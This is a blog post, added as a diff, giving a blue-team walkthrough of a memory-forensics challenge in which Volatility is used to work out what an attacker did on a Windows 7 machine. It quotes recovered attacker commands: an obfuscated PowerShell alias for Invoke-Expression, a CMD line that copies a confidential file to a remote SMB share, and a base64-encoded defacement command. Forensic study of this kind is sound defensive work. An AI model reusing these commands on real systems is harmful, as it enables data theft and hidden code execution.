@@ -1,0 +1,368 @@
+<!DOCTYPE html><html><head>
+  <meta http-equiv="content-type" content="text/html; charset=utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, minimum-scale=1.0, maximum-scale=1.0, user-scalable=yes">
+  
+  
+  <title>  Sherlock - Recollection - Easy |   Ikonw Blog </title>
+
+ 
+  
+    <link rel="icon" href="/images/avatar.jpg">
+  
+
+
+  
+<link rel="stylesheet" href="/nayo.min.css">
+ 
+<meta name="generator" content="Hexo 7.0.0"><link rel="alternate" href="/atom.xml" title="Ikonw" type="application/atom+xml">
+</head>  
+  <body>   
+    
+      <header class="header-wrapper">
+  <nav class="inner">
+    <div class="title">
+      <a href="/">
+        <img class="logo" src="/images/logo.png">
+      </a>
+    </div>
+
+    <ul class="menu">
+      <li class="item">
+        <a class="link" id="menu-home" href="/"> <!-- Home -->
+          <i class="iconfont icon-home"></i>
+        </a>
+      </li>
+      <li class="item">
+        <a class="link" id="menu-archives" href="/archives"> <!-- Archives -->
+          <i class="iconfont icon-archives"></i>
+        </a>
+      </li>
+      <li class="item">
+        <a class="link" id="menu-tags" href="/tags"> <!-- Tags -->
+          <i class="iconfont icon-tags"></i>
+        </a>
+      </li>
+      <li class="item">
+        <a class="link" id="menu-about" href="/about"> <!-- About -->
+          <i class="iconfont icon-about"></i>
+        </a>
+      </li>
+      <li class="item">
+        <a class="link" id="menu-search"> <!-- Search -->
+          <i class="iconfont icon-search"></i>
+        </a>
+      </li>
+    </ul>
+  </nav>
+</header>
+
+
+<header class="mobile-header-wrapper">
+  <i id="mobile-toggle" class="iconfont icon-menu mobile-toggle"></i>
+</header>   
+
+      <div class="container">       
+          
+          
+            <div class="container-inner">  
+          
+
+          <article class="post slideDownMin">
+  
+	
+<div class="header">
+		<p class="title">	
+			Sherlock - Recollection - Easy
+		</p>
+		<div class="info">	
+			<time>
+				Mar 24, 2024
+			</time>
+
+			
+			
+				<i class="iconfont icon-words"></i>
+				<span class="words">6021
+				</span>
+			
+		</div>
+</div> 
+	
+
+    <script type="text/x-mathjax-config">
+        var post = document.getElementsByClassName("post")[0];  
+        MathJax.Hub.Config({
+            showProcessingMessages: false,
+            messageStyle: "none",    
+            tex2jax: {
+                inlineMath:  [ ["$", "$"] , ["\\(","\\)"]],
+                displayMath: [ ["$$","$$"] , ["\\[","\\]"]],
+                skipTags: ['script', 'noscript', 'style', 'textarea', 'pre','code','a'],
+            },
+            "HTML-CSS": {            
+                showMathMenu: false
+            }
+        });
+        MathJax.Hub.Queue(["Typeset",MathJax.Hub,post]);
+    </script>
+    <style>.MathJax{outline:0;}</style>
+
+    <script type="text/javascript" src="//cdn.bootcss.com/mathjax/2.7.2/latest.js?config=TeX-AMS-MML_HTMLorMML"></script>
+ 
+
+	  <div class="typo post-content ">
+
+		
+
+			
+					<blockquote>
+<p>A junior member of our security team has been performing research and testing on what we believe to be an old and insecure operating system. We believe it may have been compromised &amp; have managed to retrieve a memory dump of the asset. We want to confirm what actions were carried out by the attacker and if any other assets in our environment might be affected. Please answer the questions below.</p>
+</blockquote>
+<span id="more"></span>
+
+<p><img src="/images/Sherlock%20-%20Recollection/image-20240324194150810.png"></p>
+<p>Recently, I have been interested in learning some blue team skills, so I have started to expand my knowledge by tackling Sherlock challenges every week. If there are any inaccuracies or areas for improvement in my writing, please point them out.</p>
+<p>This article challenge is related to memory forensics. Naturally, the tool used is the renowned <a target="_blank" rel="noopener" href="https://github.com/volatilityfoundation/volatility">volatility</a>. I have always preferred using a combination of GUI (Volatility Workbench) and command line to address memory forensics issues.</p>
+<p>I also noticed that Volatility has been updated to version 3, but I found it quite unfamiliar. Many plugins from version 2.6 haven’t been successfully ported to version 3. After trying it out, I quickly decided to stick with the older version.</p>
+<p>This week challenge seemed relatively easy, and I managed to complete 18 questions without spending too much time on them.</p>
+<p>I typically use a mix of GUI and command line, occasionally transferring files to Kali Linux for analysis, due to my familiarity with Linux’s grep command.</p>
+<h2 id="Image-profile"><a href="#Image-profile" class="headerlink" title="Image profile"></a>Image profile</h2><p>The first step after obtaining a memory dump is to identify the target’s profile:</p>
+<figure class="highlight stylus"><table><tbody><tr><td class="code"><pre><span class="line">volatility<span class="selector-class">.exe</span> -f recollection<span class="selector-class">.bin</span> imageinfo</span><br></pre></td></tr></tbody></table></figure>
+<p><img src="/images/Sherlock%20-%20Recollection/image-20240324195343604.png"></p>
+<p>For this analysis, the profile <code>Win7SP1x64</code> was used.</p>
+<h4 id="Q1-What-is-the-Operating-System-of-the-machine"><a href="#Q1-What-is-the-Operating-System-of-the-machine" class="headerlink" title="Q1 What is the Operating System of the machine?"></a>Q1 What is the Operating System of the machine?</h4><p>Based on the image info, the answer is Windows 7.</p>
+<h4 id="Q2-When-was-the-memory-dump-created"><a href="#Q2-When-was-the-memory-dump-created" class="headerlink" title="Q2 When was the memory dump created?"></a>Q2 When was the memory dump created?</h4><p>The memory dump creation date, according to the image info, is <code>2022-12-19 16:07:30 UTC+0000</code>.</p>
+<h4 id="Q3-After-the-attacker-gained-access-to-the-machine-the-attacker-copied-an-obfuscated-PowerShell-command-to-the-clipboard-What-was-the-command"><a href="#Q3-After-the-attacker-gained-access-to-the-machine-the-attacker-copied-an-obfuscated-PowerShell-command-to-the-clipboard-What-was-the-command" class="headerlink" title="Q3 After the attacker gained access to the machine, the attacker copied an obfuscated PowerShell command to the clipboard. What was the command?"></a>Q3 After the attacker gained access to the machine, the attacker copied an obfuscated PowerShell command to the clipboard. What was the command?</h4><p>To view clipboard contents, Volatility offers a plugin:</p>
+<figure class="highlight stylus"><table><tbody><tr><td class="code"><pre><span class="line">volatility<span class="selector-class">.exe</span> -f recollection<span class="selector-class">.bin</span> <span class="attr">--profile</span>=Win7SP1x64 clipboard</span><br></pre></td></tr></tbody></table></figure>
+
+<p><img src="/images/Sherlock%20-%20Recollection/image-20240324195957294.png"></p>
+<p>The command found was <code>(gv '*MDR*').naMe[3,11,2]-joIN''</code>.</p>
+<h4 id="Q4-The-attacker-copied-the-obfuscated-command-to-use-it-as-an-alias-for-a-PowerShell-cmdlet-What-is-the-cmdlet-name"><a href="#Q4-The-attacker-copied-the-obfuscated-command-to-use-it-as-an-alias-for-a-PowerShell-cmdlet-What-is-the-cmdlet-name" class="headerlink" title="Q4 The attacker copied the obfuscated command to use it as an alias for a PowerShell cmdlet. What is the cmdlet name?"></a>Q4 The attacker copied the obfuscated command to use it as an alias for a PowerShell cmdlet. What is the cmdlet name?</h4><p>Reviewing console commands, it’s noted that PowerShell executed the clipboard content using <code>IEX</code>, an alias for <code>Invoke-Expression</code>.</p>
+<p><img src="/images/Sherlock%20-%20Recollection/image-20240324200429065.png"></p>
+<h4 id="Q5-A-CMD-command-was-executed-to-attempt-to-exfiltrate-a-file-What-is-the-full-command-line"><a href="#Q5-A-CMD-command-was-executed-to-attempt-to-exfiltrate-a-file-What-is-the-full-command-line" class="headerlink" title="Q5 A CMD command was executed to attempt to exfiltrate a file. What is the full command line?"></a>Q5 A CMD command was executed to attempt to exfiltrate a file. What is the full command line?</h4><p>An attempt was made to transfer a file to an SMB share:。</p>
+<p><img src="/images/placeholder.png" data-src="/images/Sherlock%20-%20Recollection/image-20240324200706130.png" class="lazyload"></p>
+<figure class="highlight moonscript"><table><tbody><tr><td class="code"><pre><span class="line"><span class="built_in">type</span> <span class="name">C</span>:\Users\Public\Secret\Confidential.txt &gt; \\<span class="number">192.168</span><span class="number">.0</span><span class="number">.171</span>\pulice\pass.txt</span><br></pre></td></tr></tbody></table></figure>
+
+<h4 id="Q6-Following-the-above-command-now-tell-us-if-the-file-was-exfiltrated-successfully"><a href="#Q6-Following-the-above-command-now-tell-us-if-the-file-was-exfiltrated-successfully" class="headerlink" title="Q6 Following the above command, now tell us if the file was exfiltrated successfully?"></a>Q6 Following the above command, now tell us if the file was exfiltrated successfully?</h4><p>The file was not successfully exfiltrated, as indicated by the error message <code>The network path was not found</code>.</p>
+<h4 id="Q7-The-attacker-tried-to-create-a-readme-file-What-was-the-full-path-of-the-file"><a href="#Q7-The-attacker-tried-to-create-a-readme-file-What-was-the-full-path-of-the-file" class="headerlink" title="Q7 The attacker tried to create a readme file. What was the full path of the file?"></a>Q7 The attacker tried to create a readme file. What was the full path of the file?</h4><p><img src="/images/placeholder.png" data-src="/images/Sherlock%20-%20Recollection/image-20240324200955881.png" class="lazyload"></p>
+<p>Decoding a base64 string revealed the attacker’s intention to demonstrate their prowess:</p>
+<figure class="highlight bash"><table><tbody><tr><td class="code"><pre><span class="line">┌──(ikonw㉿Xing)-[~/Desktop/Mobile_project/C2]</span><br><span class="line">└─$ <span class="built_in">echo</span> <span class="string">"ZWNobyAiaGFja2VkIGJ5IG1hZmlhIiA+ICJDOlxVc2Vyc1xQdWJsaWNcT2ZmaWNlXHJlYWRtZS50eHQi"</span> | <span class="built_in">base64</span> -d</span><br><span class="line"><span class="built_in">echo</span> <span class="string">"hacked by mafia"</span> &gt; <span class="string">"C:\Users\Public\Office\readme.txt"</span></span><br></pre></td></tr></tbody></table></figure>
+
+<h4 id="Q8-What-was-the-Host-Name-of-the-machine"><a href="#Q8-What-was-the-Host-Name-of-the-machine" class="headerlink" title="Q8 What was the Host Name of the machine?"></a>Q8 What was the Host Name of the machine?</h4><p>The correct approach involves reading the Hive list and then the registry for the host name. However, the <code>net user</code> command directly revealed the hostname as <code>USER-PC</code>.</p>
+<p><img src="/images/placeholder.png" data-src="/images/Sherlock%20-%20Recollection/image-20240324201307831.png" class="lazyload"></p>
+<h4 id="Q9-How-many-user-accounts-were-in-the-machine"><a href="#Q9-How-many-user-accounts-were-in-the-machine" class="headerlink" title="Q9 How many user accounts were in the machine?"></a>Q9 How many user accounts were in the machine?</h4><p>Three user accounts were identified from the screenshot.</p>
+<h4 id="Q10-In-the-“-Device-HarddiskVolume2-Users-user-AppData-Local-Microsoft-Edge”-folder-there-were-some-sub-folders-where-there-was-a-file-named-passwords-txt-What-was-the-full-file-location-path"><a href="#Q10-In-the-“-Device-HarddiskVolume2-Users-user-AppData-Local-Microsoft-Edge”-folder-there-were-some-sub-folders-where-there-was-a-file-named-passwords-txt-What-was-the-full-file-location-path" class="headerlink" title="Q10 In the “\Device\HarddiskVolume2\Users\user\AppData\Local\Microsoft\Edge” folder there were some sub-folders where there was a file named passwords.txt. What was the full file location/path?"></a>Q10 In the “\Device\HarddiskVolume2\Users\user\AppData\Local\Microsoft\Edge” folder there were some sub-folders where there was a file named passwords.txt. What was the full file location/path?</h4><p>Using <code>filescan</code> and filtering by file name:</p>
+<figure class="highlight routeros"><table><tbody><tr><td class="code"><pre><span class="line">volatility.exe -f recollection.bin <span class="attribute">--profile</span>=Win7SP1x64 filescan | findstr <span class="string">"passwords.txt"</span></span><br></pre></td></tr></tbody></table></figure>
+
+<p><img src="/images/placeholder.png" data-src="/images/Sherlock%20-%20Recollection/image-20240324201537912.png" class="lazyload"></p>
+<p>The full path found was <code>\Device\HarddiskVolume2\Users\user\AppData\Local\Microsoft\Edge\User Data\ZxcvbnData\3.0.0.0\passwords.txt</code>.</p>
+<h4 id="Q11-A-malicious-executable-file-was-executed-using-command-The-executable-EXE-file’s-name-was-the-hash-value-of-itself-What-was-the-hash-value"><a href="#Q11-A-malicious-executable-file-was-executed-using-command-The-executable-EXE-file’s-name-was-the-hash-value-of-itself-What-was-the-hash-value" class="headerlink" title="Q11 A malicious executable file was executed using command. The executable EXE file’s name was the hash value of itself. What was the hash value?"></a>Q11 A malicious executable file was executed using command. The executable EXE file’s name was the hash value of itself. What was the hash value?</h4><p><img src="/images/placeholder.png" data-src="/images/Sherlock%20-%20Recollection/image-20240324201637722.png" class="lazyload"></p>
+<p>Returning to the console, the execution of a lengthy .exe file was noted:</p>
+<figure class="highlight llvm"><table><tbody><tr><td class="code"><pre><span class="line">b<span class="number">0</span>ad<span class="number">704122</span>d<span class="number">9</span>cffddd<span class="number">57</span>ec<span class="number">92991</span>a<span class="number">1e99</span>fc<span class="number">1</span>ac<span class="number">02</span>d<span class="number">5</span>b<span class="number">4</span>d<span class="number">8</span>fd<span class="number">31720978</span><span class="keyword">c</span><span class="number">02635</span>cb<span class="number">1</span></span><br></pre></td></tr></tbody></table></figure>
+
+<h4 id="Q12-Following-the-previous-question-what-is-the-Imphash-of-the-malicous-file-you-found-above"><a href="#Q12-Following-the-previous-question-what-is-the-Imphash-of-the-malicous-file-you-found-above" class="headerlink" title="Q12 Following the previous question, what is the Imphash of the malicous file you found above?"></a>Q12 Following the previous question, what is the Imphash of the malicous file you found above?</h4><p><img src="/images/placeholder.png" data-src="/images/Sherlock%20-%20Recollection/image-20240324201808549.png" class="lazyload"></p>
+<p>The Imphash was located by uploading the file hash to VirusTotal.</p>
+<p><img src="/images/placeholder.png" data-src="/images/Sherlock%20-%20Recollection/image-20240324201935442.png" class="lazyload"></p>
+<h4 id="Q13-Following-the-previous-question-tell-us-the-date-in-UTC-format-when-the-malicious-file-was-created"><a href="#Q13-Following-the-previous-question-tell-us-the-date-in-UTC-format-when-the-malicious-file-was-created" class="headerlink" title="Q13 Following the previous question, tell us the date in UTC format when the malicious file was created?"></a>Q13 Following the previous question, tell us the date in UTC format when the malicious file was created?</h4><p>The creation time can also be found on VirusTotal.</p>
+<p><img src="/images/placeholder.png" data-src="/images/Sherlock%20-%20Recollection/image-20240324202005515.png" class="lazyload"></p>
+<h4 id="Q14-What-was-the-local-IP-address-of-the-machine"><a href="#Q14-What-was-the-local-IP-address-of-the-machine" class="headerlink" title="Q14 What was the local IP address of the machine?"></a>Q14 What was the local IP address of the machine?</h4><p>Unfortunately, Volatility cannot directly display the local IP address.</p>
+<p>However, by examining local connections with netscan, the local IP address <code>192.168.0.104</code> was found in localhost.</p>
+<p><img src="/images/placeholder.png" data-src="/images/Sherlock%20-%20Recollection/image-20240324202213224.png" class="lazyload"></p>
+<h4 id="Q15-There-were-multiple-PowerShell-processes-where-one-process-was-a-child-process-Which-process-was-its-parent-process"><a href="#Q15-There-were-multiple-PowerShell-processes-where-one-process-was-a-child-process-Which-process-was-its-parent-process" class="headerlink" title="Q15 There were multiple PowerShell processes, where one process was a child process. Which process was its parent process?"></a>Q15 There were multiple PowerShell processes, where one process was a child process. Which process was its parent process?</h4><p><img src="/images/placeholder.png" data-src="/images/Sherlock%20-%20Recollection/image-20240324202514849.png" class="lazyload"></p>
+<p>In this case, the parent process of <code>powershell.exe</code> was identified as <code>cmd.exe</code>.</p>
+<h4 id="Q16-Attacker-might-have-used-an-email-address-to-login-a-social-media-Can-you-tell-us-the-email-address"><a href="#Q16-Attacker-might-have-used-an-email-address-to-login-a-social-media-Can-you-tell-us-the-email-address" class="headerlink" title="Q16 Attacker might have used an email address to login a social media. Can you tell us the email address?"></a>Q16 Attacker might have used an email address to login a social media. Can you tell us the email address?</h4><p>Since logging in usually involves using a browser, multiple msedge processes were found using psScan. I chose one of the earlier processes for memdump and then captured strings:</p>
+<figure class="highlight vim"><table><tbody><tr><td class="code"><pre><span class="line">volatility.<span class="keyword">exe</span> -<span class="keyword">f</span> recollection.bin --<span class="keyword">profile</span>=Win7SP1x64 memdump -<span class="keyword">p</span> <span class="number">2380</span> -D msedge</span><br><span class="line"></span><br><span class="line">strings <span class="number">2380</span>.dmp| <span class="keyword">grep</span> email</span><br></pre></td></tr></tbody></table></figure>
+
+<p><img src="/images/placeholder.png" data-src="/images/Sherlock%20-%20Recollection/image-20240324202840267.png" class="lazyload"></p>
+<p>Scrolling up in the output revealed a suspicious email:</p>
+<figure class="highlight angelscript"><table><tbody><tr><td class="code"><pre><span class="line"><span class="symbol">mafia_code1337@</span>gmail.com</span><br></pre></td></tr></tbody></table></figure>
+
+
+<h4 id="Q17-Using-MS-Edge-browser-the-victim-searched-about-a-SIEM-solution-What-is-the-SIEM-solution’s-name"><a href="#Q17-Using-MS-Edge-browser-the-victim-searched-about-a-SIEM-solution-What-is-the-SIEM-solution’s-name" class="headerlink" title="Q17 Using MS Edge browser, the victim searched about a SIEM solution. What is the SIEM solution’s name?"></a>Q17 Using MS Edge browser, the victim searched about a SIEM solution. What is the SIEM solution’s name?</h4><p>This question was challenging because Volatility does not have a plugin to extract MS Edge browsing records.</p>
+<p>Upon consulting with my good friend, I discovered that a History file stored the browser history.</p>
+<p><img src="/images/placeholder.png" data-src="/images/Sherlock%20-%20Recollection/image-20240324203037872.png" class="lazyload"></p>
+<p><img src="/images/placeholder.png" data-src="/images/Sherlock%20-%20Recollection/image-20240324203136605.png" class="lazyload"></p>
+<p>By searching for strings, I located the target address and used memdump to transfer the target file into the Kali file system:</p>
+<figure class="highlight routeros"><table><tbody><tr><td class="code"><pre><span class="line">volatility.exe -f recollection.bin <span class="attribute">--profile</span>=Win7SP1x64 dumpfiles -Q 0x000000011e0d16f0 <span class="attribute">--dump-dir</span>=\\192.168.245.175\shared\</span><br></pre></td></tr></tbody></table></figure>
+
+<figure class="highlight moonscript"><table><tbody><tr><td class="code"><pre><span class="line">Volatility Foundation Volatility Framework <span class="number">2.6</span><span class="number">.1</span></span><br><span class="line">DataSectionObject <span class="number">0x11e0d16f0</span>   None   \Device\HarddiskVolume2\Users\user\AppData\Local\Microsoft\Edge\User Data\Default\History</span><br><span class="line">SharedCacheMap <span class="number">0x11e0d16f0</span>   None   \Device\HarddiskVolume2\Users\user\AppData\Local\Microsoft\Edge\User Data\Default\History</span><br></pre></td></tr></tbody></table></figure>
+
+<p>Upon examining the strings in the target file, <code>Wazuh</code> was clearly seen.</p>
+<p><img src="/images/placeholder.png" data-src="/images/Sherlock%20-%20Recollection/image-20240324203448211.png" class="lazyload"></p>
+<h4 id="Q18-The-victim-user-downloaded-an-exe-file-The-file’s-name-was-mimicking-a-legitimate-binary-from-Microsoft-with-a-typo-i-e-legitimate-binary-is-powershell-exe-and-attacker-named-a-malware-as-powershall-exe-Tell-us-the-file-name-with-the-file-extension"><a href="#Q18-The-victim-user-downloaded-an-exe-file-The-file’s-name-was-mimicking-a-legitimate-binary-from-Microsoft-with-a-typo-i-e-legitimate-binary-is-powershell-exe-and-attacker-named-a-malware-as-powershall-exe-Tell-us-the-file-name-with-the-file-extension" class="headerlink" title="Q18 The victim user downloaded an exe file. The file’s name was mimicking a legitimate binary from Microsoft with a typo (i.e. legitimate binary is powershell.exe and attacker named a malware as powershall.exe). Tell us the file name with the file extension?"></a>Q18 The victim user downloaded an exe file. The file’s name was mimicking a legitimate binary from Microsoft with a typo (i.e. legitimate binary is powershell.exe and attacker named a malware as powershall.exe). Tell us the file name with the file extension?</h4><p>Returning to the console commands, we discovered <code>csrsss.exe</code>, which has an extra ‘s’ compared to the legitimate Windows <code>csrss.exe</code>.</p>
+<p><img src="/images/placeholder.png" data-src="/images/Sherlock%20-%20Recollection/image-20240324203628205.png" class="lazyload"></p>
+<p>Here, we also encountered the <code>wazuh</code> from the previous question.</p>
+<p><img src="/images/placeholder.png" alt="root" data-src="/images/root.gif" class="lazyload"></p>
+  	
+					
+	  </div>     
+	  
+
+	<div class="bottom">
+  <div class="other">
+    <div class="meta">
+      
+
+      
+    </div>
+
+    <div class="operate">
+      
+      <span class="text">Share</span>
+      <ul class="share">
+	   			             
+        <li class="iconfont 
+		icon-share-weixin 
+		-mob-share-weixin 
+		item"></li>		
+   	   			             
+        <li class="iconfont 
+		icon-share-weibo 
+		-mob-share-weibo 
+		item"></li>		
+   	   			             
+        <li class="iconfont 
+		icon-share-facebook 
+		-mob-share-facebook 
+		item"></li>		
+   	   			             
+        <li class="iconfont 
+		icon-share-twitter 
+		-mob-share-twitter 
+		item"></li>		
+   	   			             
+        <li class="iconfont 
+		icon-share-google 
+		-mob-share-google 
+		item"></li>		
+   	   
+</ul>	
+
+<script id="-mob-share" src="https://f1.webshare.mob.com/code/mob-share.js?appkey=21d601593a1de"></script>
+      
+    </div>
+  </div>
+
+
+  
+  <nav class="nav">
+    <div class="link">
+      
+      <a href="/2024/02/05/Android%20Malware%20RE%20-%20ThaiCamera/" class="link-wrap">
+        <strong class="caption">older</strong>
+        
+        <span class="title">
+          Android Malware RE- ThaiCamera
+        </span>
+      </a>
+      
+    </div>
+    <div class="link">
+      
+    </div>
+  </nav>
+  
+</div> 
+	
+<div class="comment">
+
+    
+    <div id="disqus_thread"></div>
+    <script>
+        (function () {
+            var d = document,
+                s = d.createElement('script');
+            s.src = 'https://' + 'ik0nw-github-io' + '.disqus.com/embed.js';
+            s.setAttribute('data-timestamp', +new Date());
+            (d.head || d.body).appendChild(s);
+        })();
+    </script>
+
+
+    
+</div>	
+</article>
+
+          </div> 
+      </div>            
+    
+        <i id="toTop" class="iconfont icon-backtotop"></i>
+
+  
+    <div class="none" id="search">
+    <div class="header">
+        <input type="text" placeholder="Typing Something here." id="search-input" class="input">
+        
+        <i id="search-cancel" class="iconfont icon-cancel"></i>
+    </div>
+
+    <div id="search-result" class="result"></div>
+</div>
+     <div class="mobile-menu">      
+
+      
+      <img class="mobile-menu-icon lazyload" src="/images/placeholder.png" data-src="/images/avatar.jpg">  
+      
+
+         
+            
+
+            <a class="mobile-menu-link" href="/">Home
+            </a>
+            
+         
+            
+
+            <a class="mobile-menu-link" href="/archives">Archives
+            </a>
+            
+         
+            
+
+            <a class="mobile-menu-link" href="/tags">Tags
+            </a>
+            
+         
+            
+
+            <a class="mobile-menu-link" href="/about">About
+            </a>
+            
+         
+                          
+
+            <a class="mobile-menu-link mobile-menu-search" href="#">Search </a>                 
+            
+         
+      
+</div>
+        
+    
+
+
+
+     
+    
+
+
+<footer class="footer">
+	<div class="inner">
+		<div class="copyright">
+			©
+			
+			2020 -
+			
+			2024
+			Ikonw
+
+			<br>
+			By <a href="https://hexo.io" target="_blank">Hexo</a> Theme <a href="https://github.com/Lemonreds/hexo-theme-Nayo" target="_blank">Nayo</a>
+		</div>
+	</div>
+</footer>   
+
+    
+<script src="/nayo.bundle.js"></script>
+           
+          
+</body></html>
